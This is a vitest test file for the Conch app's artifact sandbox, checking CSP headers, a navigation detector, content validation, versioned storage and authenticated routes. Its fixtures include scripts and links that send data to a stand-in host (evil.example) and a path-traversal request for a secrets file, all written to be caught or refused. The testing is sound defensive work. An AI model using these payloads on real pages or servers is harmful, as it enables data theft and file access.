import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { ARTIFACT_VERSIONS, Artifact } from '@conch/protocol';
import { afterEach, describe, expect, it, vi } from 'vitest';

import { buildApp } from '../app';
import { loadConfig } from '../config';
import { Services } from '../services';
import { frameDocument, frameHeaders, navigates } from './frame';
import { checkContent, fencedArtifacts } from './service';
import { ArtifactStore } from './store';

describe('a page, sealed off', () => {
  it('runs as nobody: opaque origin, no network, no way out, framed only by Conch', () => {
    const h = frameHeaders(true);
    const csp = h['content-security-policy'] ?? '';
    expect(csp).toContain('sandbox allow-scripts');
    expect(csp).not.toContain('allow-same-origin');
    expect(csp).not.toContain('allow-top-navigation');
    expect(csp).not.toContain('allow-popups');
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain('img-src data: blob:');
    expect(csp).toContain('font-src data:');
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors 'self'");
    expect(h['x-frame-options']).toBe('SAMEORIGIN');
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(h['referrer-policy']).toBe('no-referrer');
    expect(frameHeaders(false)['content-security-policy']).toMatch(/script-src 'none'.*sandbox$/);
  });

  it('notices pages that could send you somewhere else', () => {
    for (const bad of [
      '<script>location.href="https://evil.example/?d="+x</script>',
      '<script>window.location = "https://evil.example"</script>',
      '<script>window.open("https://evil.example")</script>',
      '<a href="https://evil.example">click</a>',
      '<form action="https://evil.example"><button>Go</button></form>',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      '<script>top.location="x"</script>',
      '<iframe src="https://evil.example"></iframe>',
    ])
      expect(navigates(bad), bad).toBe(true);
    for (const fine of [
      '<h1>Tip calculator</h1><script>document.getElementById("x").textContent = 1</script>',
      '<a href="#section">Jump</a>',
      '<img src="data:image/png;base64,iVBORw0KGgo=">',
    ])
      expect(navigates(fine), fine).toBe(false);
  });

  it('wraps a fragment in a whole document, and only talks to Conch’s own page', () => {
    const doc = frameDocument('<h1>Hi</h1>', {
      title: 'A <b>',
      theme: 'dark',
      parentOrigin: 'http://localhost:4317',
    });
    expect(doc).toMatch(/^<!doctype html>/);
    expect(doc).toContain('<title>A &lt;b&gt;</title>');
    expect(doc).toContain("m.conch='artifact';parent.postMessage(m,o)");
    // Links never navigate the page: they'd open a tab, which a sealed page can't.
    expect(doc).toContain('<base target="_blank">');
    expect(doc).toContain('p({open:a.href})');
    expect(doc).toContain('"http://localhost:4317"');
    const whole = frameDocument('<html><head><title>x</title></head><body><p>y</p></body></html>', {
      title: 't',
      theme: 'light',
      parentOrigin: 'http://h',
    });
    expect(whole.indexOf('<meta charset')).toBeGreaterThan(whole.indexOf('<head>'));
    expect(whole.indexOf('postMessage')).toBeLessThan(whole.indexOf('</body>'));
  });
});

describe('what each kind must be', () => {
  it('a chart is a spec that fits; an svg is svg; a table has rows', () => {
    expect(checkContent('chart', 'not json')).toMatch(/must be JSON/);
    expect(
      checkContent(
        'chart',
        JSON.stringify({ type: 'bar', labels: ['a', 'b'], series: [{ name: 's', values: [1] }] }),
      ),
    ).toMatch(/one value per label/);
    expect(
      checkContent(
        'chart',
        JSON.stringify({ type: 'bar', labels: ['a'], series: [{ name: 's', values: [1] }] }),
      ),
    ).toBeUndefined();
    expect(checkContent('svg', '<div>')).toMatch(/<svg/);
    expect(checkContent('table', 'a,b')).toMatch(/header row/);
    expect(checkContent('markdown', '  ')).toMatch(/empty/);
  });

  it('reads ```artifact blocks from a provider without tools', () => {
    const text =
      'Here:\n```artifact kind="markdown" title="Plan"\n# Plan\n- one\n```\nand\n```artifact kind="nope" title="x"\nz\n```';
    expect(fencedArtifacts(text)).toEqual([
      { kind: 'markdown', title: 'Plan', content: '# Plan\n- one' },
    ]);
  });
});

describe('the store', () => {
  it('keeps versions, drops the oldest past the limit but never the first', async () => {
    const home = await mkdtemp(join(tmpdir(), 'conch-artifacts-'));
    const store = new ArtifactStore(home);
    const a = await store.create({
      title: 'Notes',
      kind: 'markdown',
      content: 'v1',
      conversationId: 'c_1',
    });
    for (let i = 2; i <= ARTIFACT_VERSIONS + 3; i++)
      await store.addVersion(a.id, { content: `v${i}` });
    const after = await store.get(a.id);
    expect(after.versions).toHaveLength(ARTIFACT_VERSIONS);
    expect(after.versions[0]?.n).toBe(1);
    expect((await store.content(a.id, 1)).content).toBe('v1');
    expect((await store.content(a.id)).content).toBe(`v${ARTIFACT_VERSIONS + 3}`);
    await expect(store.content(a.id, 2)).rejects.toThrow(/isn’t kept/);
  });

  it('rebuilds a damaged description from the versions on disk', async () => {
    const home = await mkdtemp(join(tmpdir(), 'conch-artifacts-'));
    const heal = vi.fn();
    const store = new ArtifactStore(home, heal);
    const a = await store.create({
      title: 'Chart',
      kind: 'chart',
      content: '{}',
      conversationId: 'c_1',
    });
    await writeFile(join(home, 'artifacts', a.id, 'artifact.json'), '{ damaged');
    const back = await store.get(a.id);
    expect(back).toMatchObject({ id: a.id, kind: 'chart', versions: [{ n: 1 }] });
    expect(
      Artifact.safeParse(
        JSON.parse(await readFile(join(home, 'artifacts', a.id, 'artifact.json'), 'utf8')),
      ).success,
    ).toBe(true);
  });

  it('refuses something too big', async () => {
    const store = new ArtifactStore(await mkdtemp(join(tmpdir(), 'conch-artifacts-')));
    await expect(
      store.create({
        title: 'x',
        kind: 'markdown',
        content: 'x'.repeat(400_001),
        conversationId: 'c',
      }),
    ).rejects.toThrow(/more than/);
  });
});

describe('routes', () => {
  let close: (() => Promise<void>) | undefined;
  afterEach(async () => {
    await close?.();
    close = undefined;
  });

  async function setup() {
    const home = await mkdtemp(join(tmpdir(), 'conch-artifacts-app-'));
    const services = new Services(
      loadConfig({
        CONCH_HOME: home,
        CONCH_ENGINE: 'mock',
        CONCH_LOG_LEVEL: 'silent',
        CONCH_WEB_DIST: '/nonexistent',
      }),
    );
    const app = await buildApp(services);
    await app.ready();
    await vi.waitUntil(() => Boolean(services.mockVendor?.base), { timeout: 5000 });
    close = async () => {
      services.integrations.stop();
      await services.mockVendor?.stop();
      await app.close();
    };
    const signedIn = await app.inject({
      method: 'PUT',
      url: '/api/access/password',
      payload: { username: 'ada', password: 'a long enough sentence for conch' },
    });
    const cookie = String([signedIn.headers['set-cookie']].flat()[0]).split(';')[0] ?? '';
    return { app, services, cookie };
  }

  it('serves a page sealed, a download as a download, and nothing without signing in', async () => {
    const { app, services, cookie } = await setup();
    const page = await services.artifacts.create({
      conversationId: 'c_1',
      kind: 'html',
      title: 'Budget / 2026',
      content: '<h1>Budget</h1>',
    });
    const frame = await app.inject({
      method: 'GET',
      url: `/api/artifacts/${page.id}/versions/1/frame`,
      headers: { cookie },
    });
    expect(frame.statusCode).toBe(200);
    expect(frame.headers['content-security-policy']).toContain('sandbox allow-scripts');
    expect(frame.headers['x-frame-options']).toBe('SAMEORIGIN');
    expect(frame.body).toContain('<h1>Budget</h1>');

    const download = await app.inject({
      method: 'GET',
      url: `/api/artifacts/${page.id}/versions/1/download`,
      headers: { cookie },
    });
    expect(download.headers['content-disposition']).toMatch(
      /^attachment; filename="Budget 2026\.html"/,
    );
    expect(download.headers['content-security-policy']).toContain('sandbox');

    // A page that could send you elsewhere runs no code unless Conch's panel says you allowed it.
    const risky = await services.artifacts.create({
      conversationId: 'c_1',
      kind: 'html',
      title: 'Links',
      content: '<a href="https://evil.example/?q=secret">Go</a><script>1</script>',
    });
    expect(risky.versions[0]?.navigates).toBe(true);
    const off = await app.inject({
      method: 'GET',
      url: `/api/artifacts/${risky.id}/versions/1/frame`,
      headers: { cookie },
    });
    expect(off.headers['content-security-policy']).toContain("script-src 'none'");
    expect(off.headers['content-security-policy']).toMatch(/sandbox$/);
    const on = await app.inject({
      method: 'GET',
      url: `/api/artifacts/${risky.id}/versions/1/frame?scripts=1`,
      headers: { cookie },
    });
    expect(on.headers['content-security-policy']).toContain('sandbox allow-scripts');
    // Only pages open in a frame: a document never becomes HTML here.
    const doc = await services.artifacts.create({
      conversationId: 'c_1',
      kind: 'markdown',
      title: 'Doc',
      content: '<script>x</script>',
    });
    expect(
      (
        await app.inject({
          method: 'GET',
          url: `/api/artifacts/${doc.id}/versions/1/frame`,
          headers: { cookie },
        })
      ).statusCode,
    ).toBe(400);

    expect(
      (await app.inject({ method: 'GET', url: `/api/artifacts/${page.id}/versions/1/frame` }))
        .statusCode,
    ).toBe(401);
    expect(
      (
        await app.inject({
          method: 'GET',
          url: '/api/artifacts/..%2F..%2Fsecrets.json',
          headers: { cookie },
        })
      ).statusCode,
    ).toBe(404);
    // Another site can't frame it or fetch it.
    const cross = await app.inject({
      method: 'GET',
      url: `/api/artifacts/${page.id}/versions/1/frame`,
      headers: { cookie, 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'navigate' },
    });
    expect(cross.statusCode).toBe(403);
  });

  it('pins, renames and refreshes in a chat of its own that can only update it', async () => {
    const { app, services, cookie } = await setup();
    const chart = await services.artifacts.create({
      conversationId: 'c_1',
      kind: 'chart',
      title: 'Visitors',
      content: JSON.stringify({ type: 'bar', labels: ['a'], series: [{ name: 's', values: [1] }] }),
      request: 'A chart of my site’s visitors this week',
    });
    const pinned = await app.inject({
      method: 'PATCH',
      url: `/api/artifacts/${chart.id}`,
      headers: { cookie },
      payload: { pinned: true, title: 'Site visitors' },
    });
    expect(pinned.json()).toMatchObject({
      title: 'Site visitors',
      pinned: { at: expect.any(Number) },
    });
    const refresh = await app.inject({
      method: 'POST',
      url: `/api/artifacts/${chart.id}/refresh`,
      headers: { cookie },
    });
    expect(refresh.statusCode).toBe(200);
    const { conversationId } = refresh.json() as { conversationId: string };
    const detail = await services.conversations.detail(conversationId);
    expect(detail.conversation).toMatchObject({
      title: 'Refresh: Site visitors',
      origin: { kind: 'artifact', artifactId: chart.id },
    });
    expect(detail.events[0]).toMatchObject({
      type: 'user.message',
      text: expect.stringContaining('A chart of my site’s visitors this week'),
    });
  });
});
